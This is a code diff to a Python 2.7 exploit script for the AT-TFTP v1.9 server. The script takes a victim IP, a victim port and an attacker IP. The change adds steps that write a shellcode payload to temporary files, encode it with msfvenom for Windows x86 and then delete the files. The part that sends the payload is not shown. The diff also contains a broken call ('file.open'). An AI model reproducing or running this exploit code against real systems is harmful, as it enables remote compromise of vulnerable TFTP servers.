@@ -2,7 +2,7 @@
 
 #AT-TFTP v1.9 Exploit
 # python 2.7
-import sys, socket, binascii, subprocess
+import sys, socket, binascii, subprocess, os
 
 # to run 'python atftp_lfname.py <victim IP> <victim Port> <attacker IP>'
 
@@ -59,11 +59,29 @@ payload = "\x81\xec\xac\x0d\x00\x00" + payload
 
 ## should be able to use something like "echo payload | msfvenom -b '\x00' -a x86 --platform windows -f hex -o /tmp/atftp"
 ## and capture the result into a file
+payFileName = "/tmp/at.pf"
+payFile = file.open(payFileName, "wb")
+payFile.write(payload)
+payFile.close()
 
-cmd = "echo " + payload + "|msfvenom -b '\x00' -a x86 --platform windows -f hex -o /tmp/atftp"
+payEncodedName = "/tmp/at.pe"
+
+cmd = "cat " + payFileName + "|msfvenom -b '\x00' -a x86 --platform windows -f hex -o " + payEncodedName 
 
 rv = subprocess.call(cmd, shell=True)  # returns the exit code in unix
 print rv
+
+payEncoded = file.open(payEncodedName, "rb")
+encodedPL = payEncoded.read()
+payEncoded.close()
+
+#cleanup files
+try:
+    os.remove(payEncodedName)
+    os.remove(payFileName)
+except:
+    print "failed to delete files for cleanup"
+
 
 ## create socket and send
 
